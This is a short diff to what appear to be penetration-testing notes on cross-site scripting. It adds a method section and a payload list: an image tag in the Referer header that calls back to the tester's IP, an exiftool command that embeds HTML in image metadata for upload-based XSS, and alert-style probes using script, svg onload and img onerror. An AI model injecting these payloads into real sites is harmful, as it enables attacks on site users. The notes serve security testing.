@@ -4,6 +4,26 @@ Cheat Sheet : https://portswigger.net/web-security/cross-site-scripting/cheat-sh
 
 "sink" refers to a point in the code where user-controlled data is incorporated into the web page's HTML or JavaScript
 
+#### Methods
+
+Add XSS Payload in referer header with our IP (img)
+`<img src="http://IP/refer"></img>`
+
+XSS Via File Upload
+
+`exiftool -Comment='<H1>HelloWorld</H1>' Untitled.png`
+
+`<img src=x onerror=alert(document.domain)>`
+
+PDF File Upload
+
+SVG
+
+`https://github.com/allanlw/svg-cheatsheet`
+
+#### Payloads
+
+
 `<script>alert(1)</script>`
 
 `"><svg onload=alert(1)>`
